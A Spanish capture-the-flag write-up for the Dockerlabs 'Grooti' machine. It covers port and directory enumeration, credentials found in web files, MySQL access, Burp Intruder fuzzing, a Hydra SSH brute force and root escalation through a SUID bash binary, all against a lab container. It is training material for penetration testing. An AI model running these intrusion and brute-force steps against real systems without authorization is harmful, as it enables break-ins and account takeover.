
---
# Writeup Template: Maquina `[ Grooti ]`

- Tags: `[Etiqueta1]` `[Etiqueta2]` `[Etiqueta3]`
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquin Grooti](https://mega.nz/file/OEUQEJjC#Ckg_Wxq7MqLHTfpjXgXBAJuIxla3qFqWv42Xw_qTQYA) Enumeración de directorios web, bases de datos y escalada de privilegios en linux.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x grooti.zip
auto_deploy.sh grooti.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,3306 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu Noble))
3306/tcp open  mysql   MySQL 8.0.42-0ubuntu0.24.04.2
```
---

## Enumeracion de [Servicio  Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb whatweb http://172.17.0.2  
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[🌱 Grooti's Web]
```
### Descubrimiento de Archivos y Directorios
```bash
gobuster dir --ne -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 -x php,html,js,back,txt,sh,backup,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 1436]  
/archives             (Status: 301) [Size: 311] [--> http://172.17.0.2/archives/]  
/imagenes             (Status: 301) [Size: 311] [--> http://172.17.0.2/imagenes/]  
/secret               (Status: 301) [Size: 309] [--> http://172.17.0.2/secret/]  
```

Para la carpeta imagenes tenemos el siguiente informacion
```http
http://172.17.0.2/imagenes/README.txt

# Credenciales Encontradas
(password1) Encuentra donde ponerla ;)
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Para esta ruta tenemos una bd con usuarios potenciales
```http
http://172.17.0.2/secret/
```

Donde nos deja descargar un archivo: **instrucciones.txt** el cual a descargar revisamos la informacion con el siguiente comando:
```bash
strings instrucciones.txt

look carefully here ;)  
mysql -u rocket -p -h 172.17.0.2 --ssl=0
```

**Nota** Ganamos acceso a esa session de sql con la password: **( password1 )**
Una ves conectado identificamos las db existentes
```mysql
MySQL [(none)]> show databases;  
+--------------------+  
| Database           |  
+--------------------+  
| files_secret
```

Cambiamos de base de datos:
```mysql
MySQL [(none)]> use files_secret;
```

Revisamos las tablas para la db
```mysql
MySQL [files_secret]> show tables;  
+------------------------+  
| Tables_in_files_secret |  
+------------------------+  
| rutas
```

Revisamos los datos
```mysql
MySQL [files_secret]> select * from rutas;  
+----+------------+---------------------------------+  
| id | nombre     | ruta                            |  
+----+------------+---------------------------------+  
|  1 | imagenes   | /var/www/html/files/imagenes/   |  
|  2 | documentos | /var/www/html/files/documentos/ |  
|  3 | facturas   | /var/www/html/files/facturas/   |  
|  4 | secret     | /unprivate/secret               |  
+----+------------+---------------------------------+
```

Accediendo desde la web logramos encontrar una nueva ruta:
```http
http://172.17.0.2/unprivate/secret/
```

En la web tenemos un rango de numeros el cual desde burpsuite realizamos un ataque de tipo intruder a la siguiente peticion
En **payload** establecemos un rango de 1-100
```http
POST /unprivate/secret/generate.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://172.17.0.2
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://172.17.0.2/unprivate/secret/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

content=grooti&number=Payload
```

Una ves terminado determinamos por el tamano de la respuesta que tenemos un archivo valido
```http
POST /unprivate/secret/generate.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://172.17.0.2
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://172.17.0.2/unprivate/secret/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

content=grooti&number=16
```

Obteniendo el siguiente archivo: **( password16.zip )** que procedemos a descomprimier y reutilizamos la password que ya teniamos previamente
```bash
7z x password16.zip

Enter password (will not be echoed): password1  
Everything is Ok
```

Ahora tenemos un archivo con 34 posibles passwords que usaremos para realizar un ataque de fuerza bruta por ssh ya que esta habilitado
```bash
cat password16.txt | wc -l  

34
```

Ejecutamos el ataque de fuerza bruta:
```bash
hydra -l grooti -P password16.txt -f ssh://172.17.0.2
```

Logramos obtgener credenciales validas
```text
[DATA] attacking ssh://172.17.0.2:22/  
[22][ssh] host: 172.17.0.2   login: grooti   password: YoSoYgRoOt
```
### Intrusion
Conexion por ssh
```bash
# Reverse shell o acceso inicialssh
ssh grooti@172.17.0.2
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos enumeracion usuarios
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash  
grooti:x:1001:1001:,,,:/home/grooti:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ Grooti ]`:
Buscamos binarios con privilegio SUID
```bash
find / -perm -4000 2>/dev/null

/usr/bin/bash
```

Para ganar acceso como root ejecutamos lo siguiente
```bash
# Comando para escalar al usuario: ( root )
/usr/bin/bash -p
```

---

## Evidencia de Compromiso
Flag de root:
```bash
bash-5.2# ls -la /root

-rw-r--r-- 1 root root 1005 Jul 22 21:12 grooti.txt
```

```bash
# Captura de pantalla o output final
bash-5.2# echo -e "\n[+] Hacked... $(whoami)"  
  
[+] Hacked... root
```

---

